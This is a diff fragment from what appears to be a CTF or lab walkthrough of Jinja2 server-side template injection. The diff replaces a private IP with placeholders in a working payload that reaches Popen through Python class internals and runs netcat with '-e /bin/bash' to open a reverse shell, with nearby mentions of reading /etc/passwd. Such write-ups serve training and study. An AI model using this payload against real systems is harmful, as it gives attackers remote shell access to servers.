@@ -144,7 +144,7 @@ You need `shell=True` or you need to type independently like: `(['cat','/etc/pas
 
 Lastly to get shell we will use this payload:
 ````
-{{''.__class__.mro()[1].__subclasses__()[258](['nc','192.168.X.X','9001','-e','/bin/bash'],stdout=-1).communicate()}}
+{{''.__class__.mro()[1].__subclasses__()[258](['nc','YOUR_IP','YOUR_PORT','-e','/bin/bash'],stdout=-1).communicate()}}
 ````
 Don't forget to set netcat listener!
 
